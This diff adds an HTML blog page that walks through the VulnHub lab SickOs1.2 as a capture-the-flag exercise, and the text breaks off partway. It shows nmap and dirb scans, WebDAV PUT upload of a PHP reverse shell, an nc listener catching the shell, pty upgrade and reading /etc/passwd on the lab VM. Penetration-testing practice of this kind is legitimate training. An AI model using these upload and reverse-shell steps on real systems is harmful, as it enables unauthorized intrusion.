@@ -1,0 +1,724 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="SickOs1.2 VulnHub靶场复现 靶场介绍 靶场地址 https://www.vulnhub.com/entry/sickos-12,144/\n介绍如下\n1 2 3 4 5 6 7 8 9 10 ## About Release Name........: SickOs1.2 Date Release: 26 Apr 2016 Author......: D4rk Series......: SickOs Objective...: Get /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt Tester(s)...: h1tch1, Eagle11 Twitter.....: https://twitter.com/D4rk36 ## Description:- This is second in following series from SickOs and is independent of the prior releases, scope of challenge is to gain highest privileges on the system. 靶场部署 靶机默认是桥接，改成nat，这里我部署在VMware上\n"><title>SickOs1.2 Vulunhub靶场复现</title><link rel=canonical href=https://ke1thli.github.io/p/sickos1.2-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href=/scss/style.min.389e156f5e9bb13df5a924cfa99dfb9c39f3e01e68d9e146cd65bdae963be145.css><meta property='og:title' content="SickOs1.2 Vulunhub靶场复现"><meta property='og:description' content="SickOs1.2 VulnHub靶场复现 靶场介绍 靶场地址 https://www.vulnhub.com/entry/sickos-12,144/\n介绍如下\n1 2 3 4 5 6 7 8 9 10 ## About Release Name........: SickOs1.2 Date Release: 26 Apr 2016 Author......: D4rk Series......: SickOs Objective...: Get /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt Tester(s)...: h1tch1, Eagle11 Twitter.....: https://twitter.com/D4rk36 ## Description:- This is second in following series from SickOs and is independent of the prior releases, scope of challenge is to gain highest privileges on the system. 靶场部署 靶机默认是桥接，改成nat，这里我部署在VMware上\n"><meta property='og:url' content='https://ke1thli.github.io/p/sickos1.2-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/'><meta property='og:site_name' content='Ke1thLi 的技术笔记'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Vulnhub'><meta property='article:published_time' content='2026-09-28T00:00:00+00:00'><meta property='article:modified_time' content='2026-09-28T00:00:00+00:00'><meta name=twitter:title content="SickOs1.2 Vulunhub靶场复现"><meta name=twitter:description content="SickOs1.2 VulnHub靶场复现 靶场介绍 靶场地址 https://www.vulnhub.com/entry/sickos-12,144/\n介绍如下\n1 2 3 4 5 6 7 8 9 10 ## About Release Name........: SickOs1.2 Date Release: 26 Apr 2016 Author......: D4rk Series......: SickOs Objective...: Get /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt Tester(s)...: h1tch1, Eagle11 Twitter.....: https://twitter.com/D4rk36 ## Description:- This is second in following series from SickOs and is independent of the prior releases, scope of challenge is to gain highest privileges on the system. 靶场部署 靶机默认是桥接，改成nat，这里我部署在VMware上\n"><link rel="shortcut icon" href=/img/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar.png width=640 height=640 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎓</span></figure><div class=site-meta><h1 class=site-name><a href=/>Ke1thLi 的技术笔记</a></h1><h2 class=site-description>The harder you work, the luckier you get</h2></div></header><ol class=menu-social><li><a href=https://github.com/Ke1thLi title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span></span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title"></h2><div class=widget--toc><nav class=toc-nav id=TableOfContents><ol><li><a href=#靶场介绍>靶场介绍</a></li><li><a href=#信息收集>信息收集</a><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描和漏洞探测>端口扫描和漏洞探测</a></li><li><a href=#web服务探测>Web服务探测</a></li><li><a href=#目录爆破>目录爆破</a></li></ol></li><li><a href=#漏洞发现及其利用>漏洞发现及其利用</a><ol><li><a href=#访问-test-目录>访问 /test 目录</a></li></ol></li><li><a href=#文件上传webshell尝试>文件上传WebShell尝试</a></li><li><a href=#www-data权限下做靶机的信息收集>www-data权限下做靶机的信息收集</a><ol><li><a href=#看看john目录下有什么文件>看看john目录下有什么文件</a></li></ol></li><li><a href=#尝试提权>尝试提权</a><ol><li><a href=#sudo提权失败>sudo提权失败</a></li><li><a href=#suid-提权失败>suid 提权失败</a></li><li><a href=#尝试cron-枚举>尝试cron 枚举</a></li><li><a href=#对这个工具进行信息收集>对这个工具进行信息收集</a></li></ol></li><li><a href=#利用漏洞库寻找chkrootkit的漏洞>利用漏洞库寻找chkrootkit的漏洞</a></li><li><a href=#编写恶意脚本提权至root>编写恶意脚本提权至root</a></li><li><a href=#切换到-root-获取flag>切换到 root 获取flag</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/sickos1.2-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/>SickOs1.2 Vulunhub靶场复现</a></h2></div><footer class=article-meta><div class=inline-meta><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-09-28T00:00:00Z>Monday, September 28, 2026</time>
+<svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading></time></div></footer></div></header><aside class=article-toc><details><summary><div class=article-toc-title><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6-6 6"/></svg>
+<span></span></div></summary><nav class=toc-nav><ol><li><a href=#靶场介绍>靶场介绍</a></li><li><a href=#信息收集>信息收集</a><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描和漏洞探测>端口扫描和漏洞探测</a></li><li><a href=#web服务探测>Web服务探测</a></li><li><a href=#目录爆破>目录爆破</a></li></ol></li><li><a href=#漏洞发现及其利用>漏洞发现及其利用</a><ol><li><a href=#访问-test-目录>访问 /test 目录</a></li></ol></li><li><a href=#文件上传webshell尝试>文件上传WebShell尝试</a></li><li><a href=#www-data权限下做靶机的信息收集>www-data权限下做靶机的信息收集</a><ol><li><a href=#看看john目录下有什么文件>看看john目录下有什么文件</a></li></ol></li><li><a href=#尝试提权>尝试提权</a><ol><li><a href=#sudo提权失败>sudo提权失败</a></li><li><a href=#suid-提权失败>suid 提权失败</a></li><li><a href=#尝试cron-枚举>尝试cron 枚举</a></li><li><a href=#对这个工具进行信息收集>对这个工具进行信息收集</a></li></ol></li><li><a href=#利用漏洞库寻找chkrootkit的漏洞>利用漏洞库寻找chkrootkit的漏洞</a></li><li><a href=#编写恶意脚本提权至root>编写恶意脚本提权至root</a></li><li><a href=#切换到-root-获取flag>切换到 root 获取flag</a></li></ol></nav></details></aside><section class=article-content><h1 id=sickos12-vulnhub靶场复现>SickOs1.2 VulnHub靶场复现</h1><h2 id=靶场介绍>靶场介绍</h2><p>靶场地址 <a class=link href=https://www.vulnhub.com/entry/sickos-12,144/ target=_blank rel=noopener>https://www.vulnhub.com/entry/sickos-12,144/</a></p><p>介绍如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>## About Release
+</span></span><span class=line><span class=cl>Name........: SickOs1.2
+</span></span><span class=line><span class=cl>Date Release: 26 Apr 2016
+</span></span><span class=line><span class=cl>Author......: D4rk
+</span></span><span class=line><span class=cl>Series......: SickOs
+</span></span><span class=line><span class=cl>Objective...: Get /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
+</span></span><span class=line><span class=cl>Tester(s)...: h1tch1, Eagle11
+</span></span><span class=line><span class=cl>Twitter.....: https://twitter.com/D4rk36
+</span></span><span class=line><span class=cl>## Description:-
+</span></span><span class=line><span class=cl>This is second in following series from SickOs and is independent of the prior releases, scope of challenge is to gain highest privileges on the system.
+</span></span></code></pre></td></tr></table></div></div><p>靶场部署 靶机默认是桥接，改成nat，这里我部署在VMware上</p><h2 id=信息收集>信息收集</h2><h3 id=主机发现>主机发现</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo nmap -sn 10.10.10.0/24
+</span></span></code></pre></td></tr></table></div></div><p>获取到靶机 ip 为 10.10.10.101</p><h3 id=端口扫描和漏洞探测>端口扫描和漏洞探测</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo nmap -sS -sV -O -sC -p- --min-rate <span class=m>5000</span> 10.10.10.101 
+</span></span></code></pre></td></tr></table></div></div><div class=table-wrapper><table><thead><tr><th>端口</th><th>服务</th><th>标题/版本</th><th>备注</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)</td><td>远程登录入口；版本较旧，可关注弱口令、用户枚举、密钥登录</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>lighttpd 1.4.28；HTTP 标题：无标题 (text/html)；Server Header：lighttpd/1.4.28</td><td>Web 入口；lighttpd 版本较旧，建议目录爆破、源码/配置文件泄露、CGI 等</td></tr></tbody></table></div><p>再利用下nmap的漏洞扫描</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>PORT   STATE SERVICE
+</span></span><span class=line><span class=cl>22/tcp open  ssh
+</span></span><span class=line><span class=cl>80/tcp open  http
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-csrf: Couldn<span class=s1>&#39;t find any CSRF vulnerabilities.
+</span></span></span><span class=line><span class=cl><span class=s1>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+</span></span></span><span class=line><span class=cl><span class=s1>|_http-dombased-xss: Couldn&#39;</span>t find any DOM based XSS.
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-stored-xss: Couldn<span class=err>&#39;</span>t find any stored XSS vulnerabilities.
+</span></span><span class=line><span class=cl><span class=p>|</span> http-enum: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_  /test/: Test page
+</span></span></code></pre></td></tr></table></div></div><div class=table-wrapper><table><thead><tr><th>端口</th><th>服务</th><th>漏洞扫描发现</th><th>备注</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>本次 <code>vuln</code> 脚本未返回相关漏洞结果</td><td>远程登录入口；结合前次扫描为 OpenSSH 5.9p1 Debian 5ubuntu1.8，可后续关注弱口令、用户枚举、密钥登录</td></tr><tr><td>80</td><td>HTTP</td><td><code>http-enum</code> 发现：<code>/test/</code>（Test page）；<code>http-csrf</code>、<code>http-dombased-xss</code>、<code>http-stored-xss</code> 均未发现漏洞；<code>http-vuln-cve2017-1001000</code> 脚本执行失败（可用 <code>-d</code> 调试，通常可忽略）</td><td></td></tr></tbody></table></div><h3 id=web服务探测>Web服务探测</h3><p>虽然扫出一个 /test/ 的目录，还是先看看80端口有什么，然后我们再目录爆破尝试获取更多的攻击面,</p><p>只有一张人的图片，里面的文字是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>WHAT IF COMPUTER VIRUSES
+</span></span><span class=line><span class=cl>ARE REALLY MADE BY THE ANTI-VIRUS
+</span></span><span class=line><span class=cl>SOFTARE COMPANIES TO MAKE MONEY?
+</span></span></code></pre></td></tr></table></div></div><p>网页前端代码最后一行藏了一行</p><p><code>&lt;!-- NOTHING IN HERE ///\\\ -->>>></code></p><p>图片提到了病毒，联想到木马病毒</p><h3 id=目录爆破>目录爆破</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo dirb http://10.10.10.101
+</span></span></code></pre></td></tr></table></div></div><p>只有这个 http://10.10.10.101/test/ 访问看看</p><h2 id=漏洞发现及其利用>漏洞发现及其利用</h2><h3 id=访问-test-目录>访问 /test 目录</h3><p>这里开启了 autoindex（目录列举）</p><p>考虑到 Web 应用通常会存在文件上传或临时目录，初步推测该目录可能具备写入权限。</p><p>下一步将使用 curl 探测该目录支持的 HTTP 方法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/SickOs1.2<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ curl -i -X OPTIONS http://10.10.10.101/test/
+</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>200</span> OK
+</span></span><span class=line><span class=cl>DAV: 1,2
+</span></span><span class=line><span class=cl>MS-Author-Via: DAV
+</span></span><span class=line><span class=cl>Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
+</span></span><span class=line><span class=cl>Allow: OPTIONS, GET, HEAD, POST
+</span></span><span class=line><span class=cl>Content-Length: <span class=m>0</span>
+</span></span><span class=line><span class=cl>Date: Mon, <span class=m>28</span> Sep <span class=m>2026</span> 08:58:01 GMT
+</span></span><span class=line><span class=cl>Server: lighttpd/1.4.28
+</span></span></code></pre></td></tr></table></div></div><p>参数解释：</p><ul><li><p>-i：输出响应头，方便看状态码和 Allow 头</p></li><li><p>-X OPTIONS：指定请求方法为 OPTIONS，问服务器这个目录支持哪些方法</p></li></ul><div class=table-wrapper><table><thead><tr><th>响应头</th><th>含义</th></tr></thead><tbody><tr><td>HTTP/1.1 200 OK</td><td>服务器正常响应了 OPTIONS 请求</td></tr><tr><td>DAV: 1,2</td><td>服务器启用了 WebDAV，版本 1 和 2</td></tr><tr><td>MS-Author-Via: DAV</td><td>兼容 Microsoft WebDAV 客户端，进一步确认 WebDAV 开启</td></tr><tr><td>Allow: 第一行</td><td>支持 WebDAV 方法：PROPFIND、DELETE、MKCOL、PUT、MOVE、COPY 等</td></tr><tr><td>Allow: 第二行</td><td>也支持普通 HTTP 方法：OPTIONS、GET、HEAD、POST</td></tr><tr><td>Content-Length: 0</td><td>没有响应体，正常</td></tr><tr><td>Server:lighttpd/1.4.28</td><td>确认服务器版本</td></tr></tbody></table></div><p>最关键的两个点</p><ol><li>DAV: 1,2</li></ol><p>说明 lighttpd 开启了 WebDAV 模块。WebDAV 是一套基于 HTTP 的文件管理协议，允许客户端上传、删除、移动、复制文件。</p><ol start=2><li>Allow 里有 PUT</li></ol><p>这意味着你可以直接用 HTTP PUT 方法，往这个目录上传文件</p><p>我们继续用 curl 测试</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>curl -i -X PUT http://10.10.10.101/test/hello.txt --data <span class=s2>&#34;test123&#34;</span>
+</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>201</span> Created
+</span></span><span class=line><span class=cl>Content-Length: <span class=m>0</span>
+</span></span><span class=line><span class=cl>Date: Mon, <span class=m>28</span> Sep <span class=m>2026</span> 09:12:57 GMT
+</span></span><span class=line><span class=cl>Server: lighttpd/1.4.28
+</span></span></code></pre></td></tr></table></div></div><p>-X PUT：指定请求方法为 PUT</p><p>&ndash;data &ldquo;test123&rdquo;：写入文件的内容</p><h2 id=文件上传webshell尝试>文件上传WebShell尝试</h2><p>浏览器可以访问的这个文件，接下来上传反弹shell看看</p><p>这里我复用之前博客上的内容 <a class=link href=https://ke1thli.github.io/p/darkhole1.0-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B0%9D%E8%AF%95 target=_blank rel=noopener>https://ke1thli.github.io/p/darkhole1.0-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B0%9D%E8%AF%95</a></p><p>不过我把我把文件名字改为 sh.php</p><p>先开监听</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo nc -lvnp <span class=m>443</span>  
+</span></span></code></pre></td></tr></table></div></div><p>-l：listen，监听模式</p><p>-v：verbose，显示详细信息</p><p>-n：不做 DNS 解析，直接用 IP</p><p>-p: 指定端口</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/SickOs1.2<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ curl -i -X PUT http://10.10.10.101/test/sh.php --data-binary @sh.php   
+</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>201</span> Created
+</span></span><span class=line><span class=cl>Content-Length: <span class=m>0</span>
+</span></span><span class=line><span class=cl>Date: Mon, <span class=m>28</span> Sep <span class=m>2026</span> 09:26:09 GMT
+</span></span><span class=line><span class=cl>Server: lighttpd/1.4.28
+</span></span></code></pre></td></tr></table></div></div><p>接着浏览器刷新那个目录发现以及上传成功了，点击访问,然后回去看监听发现反弹成功顺手变为交替shell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/SickOs1.2<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nc -lvnp <span class=m>443</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> kali 的密码：
+</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>443</span> ...
+</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.10.10<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.101<span class=o>]</span> <span class=m>43155</span>
+</span></span><span class=line><span class=cl>Linux ubuntu 3.11.0-15-generic <span class=c1>#25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux</span>
+</span></span><span class=line><span class=cl> 02:27:02 up  1:19,  <span class=m>0</span> users,  load average: 0.00, 0.01, 0.05
+</span></span><span class=line><span class=cl>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
+</span></span><span class=line><span class=cl>/bin/sh: 0: can<span class=s1>&#39;t access tty; job control turned off
+</span></span></span><span class=line><span class=cl><span class=s1>$ python3 -c &#39;</span>import pty<span class=p>;</span>pty.spawn<span class=o>(</span><span class=s2>&#34;/bin/bash&#34;</span><span class=o>)</span><span class=s1>&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>/bin/sh: 1: python3: not found
+</span></span></span><span class=line><span class=cl><span class=s1>$ python -c &#39;</span>import pty<span class=p>;</span>pty.spawn<span class=o>(</span><span class=s2>&#34;/bin/bash&#34;</span><span class=o>)</span><span class=err>&#39;</span>
+</span></span><span class=line><span class=cl>www-data@ubuntu:/$
+</span></span></code></pre></td></tr></table></div></div><p>python3 不存在，这里换成了 python。说明老系统（Ubuntu 12.04）默认只有 Python 2</p><h2 id=www-data权限下做靶机的信息收集>www-data权限下做靶机的信息收集</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@ubuntu:/$ id<span class=p>;</span> pwd<span class=p>;</span> uname -a<span class=p>;</span> cat /etc/passwd
+</span></span><span class=line><span class=cl>id<span class=p>;</span> pwd<span class=p>;</span> uname -a<span class=p>;</span> cat /etc/passwd
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
+</span></span><span class=line><span class=cl>/
+</span></span><span class=line><span class=cl>Linux ubuntu 3.11.0-15-generic <span class=c1>#25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux</span>
+</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
